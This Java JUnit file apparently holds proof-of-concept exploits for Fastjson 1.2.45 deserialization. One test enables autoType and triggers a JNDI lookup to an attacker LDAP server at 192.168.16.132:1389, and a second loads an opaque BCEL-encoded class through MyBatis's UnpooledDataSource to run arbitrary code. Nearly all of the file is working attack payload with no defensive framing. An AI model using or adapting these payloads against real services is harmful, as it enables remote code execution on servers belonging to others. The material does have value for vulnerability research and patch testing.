import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import org.junit.Test;
/**
 * @author Whoopsunix
 */
public class fastjson_1_2_45 {
    @Test
    public void demo() throws Exception{
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String v1_2_45 = "{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"ldap://192.168.16.132:1389/siflky\"}}";
        Object parse = JSON.parse(v1_2_45);
    }

    @Test
    public void bcel() throws Exception {
        String bcelStr = "$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeQMo$da$40$Q$7d$L$G$83c$S$3eB$93$s$fd$e2T$c8$n$be$e4$G$adT$nz$89$vQ$5c$a5$e7e$bb$a2$9b$g$db$b2$97$u$fdE$3dsI$ab$i$fa$D$fa$a3$aa$cen$p$82$d4$3d$cch$de$9b$f7fv$f7$f7$9f$fb_$A$ce$d0$f3$e0b$dfC$XOj80$f9$d0$c5S$XG$$$8e$Z$aa$p$95$u$fd$96$a1$dc$l$5c18$e3$f4$b3d$d8$LU$o$3f$ac$96s$99$7f$e4$f3$98$90v$98$K$k_$f1$5c$99$fa$Bt$f4$XU$90G8$b9$95b$c8P$h$89$f8$c1$ae$Ri$$$beNyf$5bi$m$83$X$a5$ab$5c$c8$f7$caH$ebFrz$cdo$b8$8f$g$ea$$$9e$f9x$8e$X$Mo$82$e8$5b$a1$e52x$97e$b1$S$5c$ab4$v$821$8f$c5$w$e6$3a$cdOy$96$F$e34$d12$d1E0$e5b$Wm$b1$3e$5e$e2$VC$c7$Y$H1O$W$c1$e4V$c8$cc$98$d0$baf$sC$f3$91$9c$cd$af$a5$d0$M$adG$e8r$95h$b5$a4$N$bd$85$d4$9b$a2$db$l$84$ff$f5$d0$8d$ji$z_$f7$b7$d8H$e7$wY$M$b7$F$Xy$wdQ$M$d1C$95$7e$c3$9c$S$98$b98E$8f$aa$802$a3$5c9$f9$B$b6$b6$f4$O$c5$aa$F$j$f8$U$fd$7f$Nh$60$97r$N$7b$h$f1$cc$9a$B$bb$3fQj$97$ef$e0$7c$fa$O$e7$7cm$b1$3a$e9$w$u$5b$b769$81$c6$d7Ie$5e$bdA$a8og$BM$cb$94B$X$z$90$b0m$e1$ce_5l$abWE$C$A$A";
        String payload = "{\n" +
                "    \"@type\":\"com.alibaba.fastjson.JSONObject\",\n" +
                "    \"name\":{\n" +
                "        \"@type\":\"java.lang.Class\",\n" +
                "        \"val\":\"org.apache.ibatis.datasource.unpooled.UnpooledDataSource\"\n" +
                "    },\n" +
                "    \"c\":{\n" +
                "        \"@type\":\"org.apache.ibatis.datasource.unpooled.UnpooledDataSource\",\n" +
                "        \"key\":{\n" +
                "            \"@type\":\"java.lang.Class\",\n" +
                "            \"val\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "        },\n" +
                "        \"driverClassLoader\":{\n" +
                "            \"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "        },\n" +
                "        \"driver\":\""+ bcelStr+"\"\n" +
                "    }\n" +
                "}";
        System.out.println(payload);
        JSON.parseObject(payload);
    }
}
